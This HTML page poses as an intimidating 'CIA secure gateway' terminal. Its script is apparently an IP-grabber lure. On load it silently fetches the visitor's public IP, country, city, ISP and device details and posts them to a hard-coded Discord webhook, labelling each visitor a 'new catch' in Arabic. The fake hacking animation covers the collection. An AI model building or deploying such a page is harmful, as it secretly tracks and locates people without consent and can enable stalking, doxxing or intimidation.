<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE TERMINAL - ACCESS RESTRICTED</title>
    <style>
        body {
            background-color: #050505;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            margin: 0;
            overflow-x: hidden;
        }
        .terminal {
            max-width: 800px;
            margin: auto;
            border: 1px solid #00ff66;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
            background: rgba(0, 0, 0, 0.9);
        }
        h2 { color: #ff0055; text-align: center; }
        .line { margin: 5px 0; }
        .highlight { color: #ffff00; }
        .warning { color: #ff3333; font-weight: bold; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>[!] CIA-SECURE GATEWAY v4.8 [!]</h2>
        <div id="output"></div>
    </div>

    <script>
        const output = document.getElementById('output');
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543430352826011739/loVSz6Py2mno8uN83WxwfGqskhkoaAg4GYOz6hghqLvG7B24p-fPqePOvbkSm5NvyO6b";

        async function sendToDiscord(message) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });
            } catch (e) {}
        }

        function getDetailedDevice() {
            let ua = navigator.userAgent;
            let device = "Desktop / Other";
            
            if (/android/i.test(ua)) {
                let match = ua.match(/\b(SM-[A-Z0-9]+|Redmi|POCO|Infinix|TECNO|VIVO|OPPO|Realme|HUAWEI|Honor|OnePlus)[^\s)]*/i);
                if (match) {
                    device = "Android: " + match[0];
                } else {
                    let androidVersion = ua.match(/Android\s([0-9\.]+)/);
                    device = androidVersion ? `Android Phone (v${androidVersion[1]})` : "Android Phone";
                }
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                device = "Apple iOS Device";
            } else if (/windows/i.test(ua)) {
                device = "Windows PC";
            } else if (/macintosh/i.test(ua)) {
                device = "Mac OS Computer";
            }
            return device;
        }

        async function collectAndSend() {
            let deviceName = getDetailedDevice();
            let ip = "Unknown";
            let locationInfo = "Unknown";

            // جلب الـ IP الحقيقي بطريقة مضمونة جداً
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                ip = ipData.ip;
            } catch (err) {
                ip = "Failed to fetch IP";
            }

            // محاولة جلب تفاصيل الدولة والشبكة بناءً على الـ IP
            try {
                let res = await fetch(`https://ipapi.co/${ip}/json/`);
                let data = await res.json();
                locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'} (${data.org || 'Unknown ISP'})`;
            } catch (err) {
                locationInfo = "Location unavailable";
            }

            let msg = `🚨 **[ صيد جديد دخل للموقع ]** 🚨\n\n` +
                      `📱 **الجهاز:** ${deviceName}\n` +
                      `🌐 **الـ IP:** \`${ip}\`\n` +
                      `🏢 **الشبكة والموقع:** ${locationInfo}\n` +
                      `💻 **النظام:** ${navigator.platform}`;
            
            await sendToDiscord(msg);
        }

        collectAndSend();

        const logs = [
            "[+] Initializing secure handshake...",
            "[+] Bypassing firewall and proxy layers...",
            "[+] Target connection detected successfully.",
            "[+] Extracting system fingerprints & hardware specs...",
            "--------------------------------------------------",
            "[*] Client Device: " + getDetailedDevice(),
            "[*] Browser Engine: " + navigator.userAgent,
            "[*] Screen Resolution: " + window.screen.width + 'x' + window.screen.height,
            "--------------------------------------------------",
            "[!] WARNING: UNAUTHORIZED ACCESS ATTEMPT LOGGED.",
            "[!] GEOLOCATION AND HARDWARE SIGNATURE RECORDED.",
            "[✔] Session secured. Connection closed."
        ];

        let index = 0;
        function typeLine() {
            if (index < logs.length) {
                const div = document.createElement('div');
                div.className = 'line';
                if(logs[index].includes("WARNING")) div.className += " warning";
                else if(logs[index].includes("*")) div.className += " highlight";
                
                div.textContent = logs[index];
                output.appendChild(div);
                index++;
                setTimeout(typeLine, 350);
            }
        }

        window.onload = typeLine;
    </script>
</body>
</html>
